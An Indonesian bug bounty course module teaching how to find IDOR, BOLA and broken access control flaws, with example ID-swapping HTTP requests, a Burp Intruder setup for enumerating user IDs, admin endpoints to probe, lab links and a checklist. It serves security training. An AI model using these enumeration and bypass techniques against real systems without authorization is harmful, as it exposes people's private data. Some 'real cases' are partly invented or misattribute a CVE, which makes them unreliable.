# Sesi 07 — IDOR, BOLA & Broken Access Control

> **Level:** Intermediate  
> **Durasi Estimasi:** 4–5 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals), Sesi 04 (Recon)  
> **Tools:** Burp Suite, Autorize Extension, Postman

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Memahami perbedaan IDOR, BOLA, BFAC, dan privilege escalation
- Menemukan IDOR secara sistematis di path, query string, body, dan response
- Menggunakan Autorize Burp Extension untuk pengujian multi-role otomatis
- Mengidentifikasi pola BOLA di REST API modern
- Menulis laporan bug bounty yang convincing untuk access control bugs

---

## 📚 Bagian 1 — Konsep Dasar

### 1.1 Apa Itu IDOR?

**IDOR (Insecure Direct Object Reference)** terjadi ketika server **memberikan akses ke resource berdasarkan identifier yang diberikan user, tanpa memvalidasi apakah user tersebut berhak mengakses resource itu**.

```
AMAN (dengan validasi):
User A (ID:100) → Request /api/invoice/555 
Server: "Invoice 555 milik user ID 200, bukan 100" → 403 FORBIDDEN ✅

TIDAK AMAN (IDOR):
User A (ID:100) → Request /api/invoice/555
Server: "Oke, ini invoice 555" → 200 OK ← IDOR! ❌
```

### 1.2 Perbedaan Horizontal vs Vertical Privilege Escalation

```
HORIZONTAL ESCALATION (IDOR klasik):
User A ────► Data User B
(sama-sama role "user", tapi akses data orang lain)

Contoh: /api/user/profile/1234 → ubah ke /api/user/profile/1235

VERTICAL ESCALATION (BFAC):
User biasa ────► Fungsi Admin
(akses fitur/endpoint yang seharusnya hanya untuk role lebih tinggi)

Contoh: POST /api/admin/deleteUser (seharusnya hanya admin)
```

### 1.3 BOLA vs IDOR

| Istilah | Konteks | Deskripsi |
|---------|---------|-----------|
| **IDOR** | General web | Object reference langsung di URL/parameter |
| **BOLA** | OWASP API Security | IDOR di REST API — Broken Object Level Authorization |
| **BFAC** | OWASP API Security | Broken Function Level Access Control |
| **IDOR via Response** | Response manipulation | Object bocor di response, bukan request |

---

## 📚 Bagian 2 — Jenis-Jenis IDOR

### 2.1 IDOR di Path Parameter

```http
# Akses profil sendiri
GET /api/v1/users/1337/profile HTTP/1.1

# IDOR: ubah ID ke user lain
GET /api/v1/users/1338/profile HTTP/1.1
GET /api/v1/users/1/profile HTTP/1.1      ← akun pertama/admin?

# Contoh lain
GET /api/orders/ORD-001234      → ORD-001235?
GET /documents/invoice_2024_Q1.pdf → invoice_2024_Q2.pdf?
GET /api/messages/thread/55     → 54, 56?
```

### 2.2 IDOR di Query String

```http
# Profile
GET /profile?user_id=1337

# Download
GET /download?file_id=abc123&user=1337

# Report
GET /report/export?report_id=9901&format=pdf
```

### 2.3 IDOR di Request Body (POST/PUT)

```http
# Update profil — apakah server validasi user_id di body?
PUT /api/user/profile HTTP/1.1
Content-Type: application/json

{
  "user_id": 1338,    ← ubah ke ID orang lain
  "email": "attacker@evil.com",
  "phone": "+6281234567"
}
```

### 2.4 IDOR di Response (Data Leakage)

```http
GET /api/v1/order/12345 HTTP/1.1
Authorization: Bearer [TOKEN_USER_A]

HTTP/1.1 200 OK
{
  "order_id": "12345",
  "items": [...],
  "user_id": 9999,        ← bukan milik kita, tapi bisa lihat!
  "payment_card": "4242", ← data sensitif!
  "address": "Jl. Victim..."
}
```

### 2.5 Indirect IDOR (via Referensi Tidak Langsung)

```http
# Attachment di email/pesan
GET /attachments/download/uuid-abc123-def456

# File dengan nama prediktable
GET /exports/user_report_2024_january.csv
GET /exports/user_report_2024_february.csv  ← milik user lain!

# Token sequential
GET /share/view?token=ZWRpdF8x  
# Decode Base64: edit_1 → edit_2 → edit_3...
```

---

## 📚 Bagian 3 — Metodologi Testing IDOR

### 3.1 Step-by-Step Manual Testing

```
LANGKAH 1: Buat 2 akun test
  - Account A: attacker@test.com (akun yang kita kontrol penuh)
  - Account B: victim@test.com (akun korban)

LANGKAH 2: Login sebagai Account B, lakukan aksi
  - Buat order, upload dokumen, kirim pesan, dll
  - Catat semua ID yang muncul di URL/response
  - Contoh: Order ID = 5001

LANGKAH 3: Login sebagai Account A (attacker)
  - Coba akses resource milik Account B:
    GET /api/orders/5001

LANGKAH 4: Analisis response
  - 200 OK + data order B = IDOR CONFIRMED ✅
  - 403 Forbidden = Protected (tapi coba bypass teknik lain)
  - 401 = Auth issue, bukan IDOR spesifik

LANGKAH 5: Test operasi lain (CRUD)
  - GET (read) — apakah bisa baca?
  - PUT/PATCH (update) — apakah bisa modifikasi?
  - DELETE — apakah bisa hapus?
```

### 3.2 Menggunakan Autorize Burp Extension

Autorize adalah ekstensi Burp untuk **otomatis test access control dengan multiple session/role**.

```
SETUP:
1. Install Autorize: Burp → Extensions → BApp Store → Autorize
2. Login sebagai User A (low privilege) → Copy cookie/token
3. Buka Autorize tab → Paste cookie User A
4. Login sebagai User B (high privilege) / Admin → Browse normally
5. Autorize intercept setiap request dan test ulang dengan cookie User A
```

**Cara baca hasil Autorize:**

| Status | Warna | Arti |
|--------|-------|------|
| `Bypassed!` | 🔴 Merah | IDOR/Access Control bug ditemukan |
| `Enforced!` | 🟢 Hijau | Authorization bekerja dengan benar |
| `Is enforced???` | 🟡 Kuning | Response berbeda, perlu investigasi manual |

### 3.3 Mass Testing dengan Burp Intruder

```http
# Setup Intruder untuk enumerate IDs
GET /api/v1/user/§1337§/profile HTTP/1.1
Host: target.com
Authorization: Bearer [TOKEN_USER_A]

# Payload type: Numbers
# From: 1
# To: 2000
# Step: 1

# Grep match di response untuk "email" / "name" → temukan valid user IDs
```

---

## 📚 Bagian 4 — BOLA di REST API

### 4.1 Pola BOLA yang Paling Umum

```http
# Pattern 1: ID di path
GET /api/v2/accounts/{account_id}/transactions
GET /api/v2/projects/{project_id}/members
GET /api/v2/invoices/{invoice_id}/pdf

# Pattern 2: ID di query param
GET /api/reports?company_id=1234
GET /api/export?dataset_id=5678

# Pattern 3: Nested resources
GET /api/orgs/500/teams/25/members    ← apakah validasi org membership?
GET /api/workspaces/100/documents/50  ← apakah validasi workspace access?
```

### 4.2 UUID Bukan Proteksi!

Banyak developer mengira menggunakan UUID (random) = aman dari IDOR. **Ini salah!**

```
UUID contoh: f47ac10b-58cc-4372-a567-0e02b2c3d479

Mengapa UUID tidak cukup:
1. UUID bocor di response lain (misalnya response list, email, log)
2. UUID bisa ditemukan via recon (wayback machine, JS files, dll)
3. UUID hanya obscure ID, bukan authorization check

IDOR dengan UUID tetap valid jika server tidak cek ownership!
```

### 4.3 BFAC (Broken Function Level Access Control)

```http
# User biasa mencoba endpoint admin
POST /api/admin/users/delete HTTP/1.1
Host: target.com
Authorization: Bearer [USER_TOKEN]  ← bukan admin token!
Content-Type: application/json

{"user_id": "victim_id_123"}

# Jika response 200 OK → BFAC!
# Jika response 403 → Protected

# Common admin endpoints untuk dicoba:
/api/admin/*
/api/internal/*
/api/manage/*
/api/v1/users/all
/api/v1/settings/global
/api/v1/export/all_users
```

---

## 📚 Bagian 5 — IDOR di Parameter Tersembunyi

### 5.1 Temukan Parameter Tersembunyi

```javascript
// Di source code / JS files, cari:
grep -r "user_id" assets/
grep -r "account_id" assets/
grep -r "document_id" assets/

// Di Burp: klik kanan request → Engagement Tools → Param Miner
// Param Miner akan coba ratusan parameter tersembunyi
```

### 5.2 HTTP Parameter Pollution (HPP) untuk IDOR

```http
# Normal request
GET /api/messages?user_id=1337 HTTP/1.1

# HPP: kirim dua kali, server mana yang "menang"?
GET /api/messages?user_id=1337&user_id=1338 HTTP/1.1

# Atau di body
user_id=1337&user_id=1338
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — IDOR di Twitter/X (Disclosed)

> **Platform:** HackerOne  
> **Report:** Pola serupa dari beberapa disclosed reports tentang social media DM  
> **Severity:** High

**Skenario (terinspirasi dari pola umum):**
Peneliti menemukan bahwa endpoint `/api/v1/direct_messages/thread/{thread_id}` tidak memvalidasi apakah user yang mengirim request adalah participant dalam thread tersebut.

```http
# User A memiliki thread ID 9001 dengan User C
GET /api/v1/direct_messages/thread/9001 HTTP/1.1
Authorization: Bearer [TOKEN_USER_B]  ← User B bukan participant!

# Response: 200 OK dengan semua isi pesan
{
  "thread_id": 9001,
  "participants": ["user_a", "user_c"],
  "messages": [
    {"from": "user_a", "content": "Private message content here..."}
  ]
}
```

**Impact:** Privacy violation — membaca pesan private orang lain.  
**Fix:** Validasi bahwa `requesting_user` adalah salah satu `participants` sebelum return data.

---

### Case 2 — IDOR di Shopify Partner Dashboard (Public Report)

> **Platform:** HackerOne — Shopify  
> **Referensi:** [HackerOne Shopify Disclosed Reports](https://hackerone.com/shopify)  
> **Severity:** High

**Skenario:**
Endpoint untuk mengakses data shop partner menggunakan sequential integer sebagai shop_id. Peneliti menemukan bahwa mengubah shop_id di request memungkinkan melihat data toko orang lain.

```http
# Akses dashboard sendiri
GET /partners/api/v2/shops/12345/analytics HTTP/1.1
Cookie: partner_session=...

# IDOR: ubah shop_id
GET /partners/api/v2/shops/12346/analytics HTTP/1.1
Cookie: partner_session=...   ← session yang sama, bukan pemilik shop 12346

# Response berisi revenue, customer data, transaction history toko lain
```

---

### Case 3 — IDOR di GitLab (CVE-2021-22214)

> **Source:** GitLab Security Advisory  
> **CVE:** CVE-2021-22214  
> **Type:** IDOR / Unauthorized Access

**Deskripsi:**
GitLab memiliki bug di mana API endpoint untuk mengakses pipeline job artifacts tidak memvalidasi project membership dengan benar. User dari project A bisa mengakses artifacts dari project B (private) dengan mengetahui job ID.

```http
# User dari Project A mencoba akses artifacts Project B
GET /api/v4/projects/[PROJECT_B_ID]/jobs/[JOB_ID]/artifacts HTTP/1.1
Private-Token: [TOKEN_PROJECT_A_MEMBER]

# Seharusnya 403, tapi bug membuatnya 200 OK
```

**Pelajaran:** IDOR tidak hanya di data user — pipeline artifacts, dokumen internal, dan log juga bisa jadi target.

---

### Case 4 — IDOR Massif di Parcel Tracking (Bug Bounty Pattern)

> **Tipe:** IDOR via Predictable Reference  
> **Inspirasi:** Pola umum di e-commerce/logistics bug bounty  
> **Severity:** High (P2)

```http
# Tracking number prediktable
GET /api/tracking/TRK-2024-001234 HTTP/1.1

# Enumerate
GET /api/tracking/TRK-2024-001235 HTTP/1.1
GET /api/tracking/TRK-2024-001236 HTTP/1.1

# Response bocorkan: nama, alamat lengkap, nomor telepon, isi paket
{
  "tracking_id": "TRK-2024-001235",
  "recipient_name": "John Doe",
  "address": "Jl. Contoh No. 123, Jakarta",
  "phone": "+62812345678",
  "items": ["iPhone 15 Pro Max"]
}
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy (IDOR Labs — Gratis)
- 🔗 [IDOR Lab 1: Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)
- 🔗 [Access Control Vulnerability Labs](https://portswigger.net/web-security/access-control)
- 🔗 [Horizontal privilege escalation](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)

### Lab 2 — TryHackMe
- 🔗 [IDOR Room](https://tryhackme.com/room/idor)
- 🔗 [OWASP Top 10 — Broken Access Control](https://tryhackme.com/room/owasptop10)

### Lab 3 — DVWA (Damn Vulnerable Web Application)
```bash
# Setup local
docker run --rm -it -p 80:80 vulnerables/web-dvwa
# Login: admin / password
# DVWA Security: Low
# Modul: Insecure CAPTCHA (pola IDOR), File Inclusion
```

### Lab 4 — HackTheBox
- 🔗 [HTB Academy — Broken Authentication](https://academy.hackthebox.com/module/details/80)
- 🔗 [Retired machines dengan IDOR: BountyHunter, Previse]

### Lab 5 — OWASP Juice Shop
```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
# Challenges: View another user's basket, Delete user reviews
```

---

## 📋 IDOR Testing Checklist

```markdown
## IDOR Checklist untuk [ENDPOINT]

### Identifikasi Object References
- [ ] ID di path parameter (/api/resource/{id})
- [ ] ID di query string (?id=, ?user=, ?doc=)
- [ ] ID di request body (JSON/form data)
- [ ] ID di response yang bocor
- [ ] Hash/UUID — apakah bisa ditemukan?

### Testing dengan Dua Akun
- [ ] Account A (attacker) dibuat
- [ ] Account B (victim) dibuat
- [ ] Resource milik Account B dicatat ID-nya
- [ ] Akses resource B menggunakan session A
- [ ] Cek semua HTTP methods (GET/POST/PUT/PATCH/DELETE)

### Privilege Escalation
- [ ] Akses endpoint /admin/* dengan user token
- [ ] Akses endpoint /internal/* dengan user token
- [ ] Coba parameter role/is_admin di request body

### Autorize Setup
- [ ] Autorize extension installed
- [ ] Cookie user privilege rendah di-paste ke Autorize
- [ ] Browse sebagai user privilege tinggi
- [ ] Review semua "Bypassed!" flags
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| OWASP | [IDOR Definition](https://owasp.org/www-chapter-ghana/presentations/OWASP_Insecure_Direct_Object_Reference.pdf) | IDOR concept |
| OWASP API Security | [BOLA/API1:2023](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) | API IDOR |
| PortSwigger | [Access Control Guide](https://portswigger.net/web-security/access-control) | Testing guide |
| HackerOne Hacktivity | [IDOR Reports](https://hackerone.com/hacktivity?querystring=IDOR) | Real reports |
| Nahamsec | [IDOR Bug Bounty Tips](https://www.youtube.com/watch?v=1S2YaN5gRi4) | Practical tips |

---

## 🔑 Key Takeaways

1. **IDOR = paling banyak dilaporkan** di HackerOne karena ada di hampir setiap aplikasi
2. **UUID bukan proteksi** — authorization check harus di server, bukan di obscurity
3. **Selalu test CRUD** — bukan hanya GET, tapi juga POST/PUT/DELETE
4. **Multi-role testing** — Autorize menghemat waktu testing secara dramatis
5. **Chain IDOR** — IDOR kecil bisa chain ke impact lebih besar (PII leak, ATO)

---

*Sesi berikutnya: **Sesi 08 — XSS & HTML Injection Mastery***
